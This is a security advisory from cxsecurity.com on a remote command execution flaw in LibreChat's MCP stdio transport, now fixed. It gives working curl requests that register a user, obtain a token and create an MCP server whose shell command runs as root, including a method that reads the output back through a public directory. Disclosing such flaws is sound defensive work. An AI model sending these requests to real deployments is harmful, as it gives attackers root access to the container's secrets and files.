---
title: LibreChat MCP Stdio Remote Command Execution
url: https://cxsecurity.com/issue/WLB-2026010006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-12
fetch_date: 2026-01-13T03:26:06.832683
---

# LibreChat MCP Stdio Remote Command Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LibreChat MCP Stdio Remote Command Execution** **2026.01.12**  Credit:  **[Jeremy Brown](https://cxsecurity.com/author/Jeremy%2BBrown%2B/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

LibreChat MCP Stdio Remote Command Execution
Jeremy Brown (jbrown3264/gmail), January 2026
=======
Summary
=======
LibreChat's Model Context Protocol (MCP) implementation contained a RCE vulnerability (CVE-2026-22252) that allowed any authenticated user to execute commands as root on the Docker container. A single API request could trigger the exploit by taking advantage of the exposure of the stdio transport mechanism to platform users.
============
How It Works
============
There were a combination of factors that created exploitable scenario:
Access: By default, any registered user was allowed to create new MCP servers.
No Input Validation: The command field for the stdio transport type was not validated and exposed to users (instead of only admins). This meant you could pass any shell command you want.
Immediate Execution: The command was executed immediately upon the creation of the MCP server during the "inspection" phase, even before a proper MCP handshake is established.
============
Exploitation
============
--------------------
Step 1: Authenticate
--------------------
First, you need to register a user and get an authentication token.
# Register a new user
curl -X POST 'http://localhost:3080/api/auth/register' \
-H 'Content-Type: application/json' \
-d '{
"name": "Attacker",
"email": "test@example.librechat",
"password": "Abc12345!",
"confirm\_password": "Abc12345!",
"username": "attacker"
}'
# Login to get the token
TOKEN=$(curl -s -X POST 'http://localhost:3080/api/auth/login' \
-H 'Content-Type: application/json' \
-d '{"email":"test@example.librechat","password":"Abc12345!"}' \
| jq -r '.token')
---------------------------
Step 2: Execute the Command
---------------------------
Now, create the new "MCP" server. The command will be executed immediately.
-----------------------------------
Method 1: Basic Exploit (No Output)
-----------------------------------
This method executes a command but doesn't return the output directly. You'd need another way to verify execution.
curl -X POST 'http://localhost:3080/api/mcp/servers' \
-H "Authorization: Bearer $TOKEN" \
-H 'Content-Type: application/json' \
-d '{
"config": {
"type": "stdio",
"title": "server",
"command": "/bin/sh",
"args": ["-c", "id > /tmp/output.txt"]
}
}'
You can then verify the command was executed:
docker exec LibreChat cat /tmp/output.txt
# uid=0(root) gid=0(root) groups=0(root)...
------------------------------------------
Method 2: Exploit with Output Exfiltration
------------------------------------------
We can also write the output to a file in a publicly accessible directory and retrieve it with another request.
curl -X POST 'http://localhost:3080/api/mcp/servers' \
-H "Authorization: Bearer $TOKEN" \
-H 'Content-Type: application/json' \
-d '{
"config": {
"type": "stdio",
"title": "server",
"command": "/bin/sh",
"args": ["-c", "id > /app/client/public/images/output.txt"]
}
}'
Now, retrieve the output:
curl http://localhost:3080/images/output.txt
# uid=0(root) gid=0(root) groups=0(root)...
======
Impact
======
The vulnerability allows anyone who can access the server on a network and register to account to execute arbitrary commands as the root user on the vulnerable container.
This means they could do things such as:
Steal sensitive data: Access any keys or secrets on the container.
Access the filesystem: Read and write with root privileges in the container.
Pivot to the internal network: Use the compromised container as a foothold to attack other services on the network.
Inject malicious content: Modify served files to launch supply chain attacks.
==========
Mitigation
==========
The LibreChat team was responsive, fixed the bug very quickly and published the advisory in about 1 week. It fixed in v0.8.2-rc2 with commit 211b39f addressing the root cause by removing the stdio transport option from the user-configurable API endpoint.
The MCPServerUserInputSchema was updated to exclude StdioOptionsSchema so only administrators can configure stdio transports through the librechat.yaml file.
==========
References
==========
GitHub Security Advisory: GHSA-cxhj-j78r-p88f
Fix Commit: 211b39f3113d4e6ecab84be0a83f4e9c9dea127f

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top